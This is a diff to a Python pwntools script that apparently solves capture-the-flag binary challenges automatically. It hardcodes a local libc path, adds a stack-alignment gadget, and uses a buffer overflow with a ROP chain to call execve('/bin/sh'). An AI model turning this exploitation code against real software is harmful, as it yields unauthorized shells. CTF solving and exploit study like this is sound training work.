@@ -28,7 +28,8 @@ class App:
 
         # if there is a libc version then yay
         try:
-            self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)
+            self.pwnlibc = ELF((b"./ace-student/libc.so.6").decode(), False)
+            #self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)
 
         except:
             pass
@@ -44,15 +45,7 @@ class App:
         self.elf = self.pipe.cmd("aflj")
         
         #one = self.find_one_gadget(binary)
-        #self.bonus(binary)
-
-    # ================ SOLVE FUNCTIONS ===================
-
-    # it is just a ret2win with a strcmp at the beginning
-    # to distinguish it you just have to look for the `strlen`
-    # also be careful with the win function since it sometimes calls /bin/sh and other times cat flag.txt
-    def bonus(self, binary):
-        pass
+        self.ret2execve(binary)
 
     def ret2syscall(self, binary):
         io = process(binary)
@@ -97,14 +90,23 @@ class App:
         
         io.interactive()
 
-    def ret2execve(self, binary):
+    def ret2execve(self, binary, add_ret=True):
         io = process(binary)
 
         binsh = next(self.pwnelf.search(b"/bin/sh"))
-        
-        # now that we have /bin/sh address, do the ROP chain
+        ret = None
+
+        for file, gadget in self.rs.search(search="ret"):
+            if "ret;" in str(gadget):
+                ret = int(str(gadget).split(":")[0], 16)
+                break
+
         payload = self.find_overflow(binary)
         payload += self.generate_rop_chain({"rdi":binsh, "rsi":0, "rdx":0})
+        
+        if add_ret:
+            payload += p64(ret)
+
         payload += p64(self.pwnelf.plt["execve"])
 
         io.sendlineafter(b">>>", payload)
@@ -433,6 +435,7 @@ class App:
 
                 # we have found our gadget, now time to add it to our payload
                 payload += p64(int(use.split(":")[0], 16))
+                print(use)
                 
                 alice = use.split(":")
                 instructions = alice[1].split(";")
@@ -444,9 +447,11 @@ class App:
 
                     if ins[-3:] in dict_registers.keys():
                         payload += p64(dict_registers[ins[-3:]])
+                        print(hex(dict_registers[ins[-3:]]))
                         completed.append(ins[-3:])
 
                     else:
+                        print("0xdeadbeef")
                         payload += p64(0xdeadbeef)
 
         return payload
@@ -456,7 +461,7 @@ class App:
     def find_one_gadget(self, binary):
         addresses = []
 
-        io = subprocess.run([b"one_gadget", self.pwnelf.runpath + b"/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+        io = subprocess.run([b"one_gadget", b"./ace-student/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
         io = io.split(" ")
 
         for alice in io:
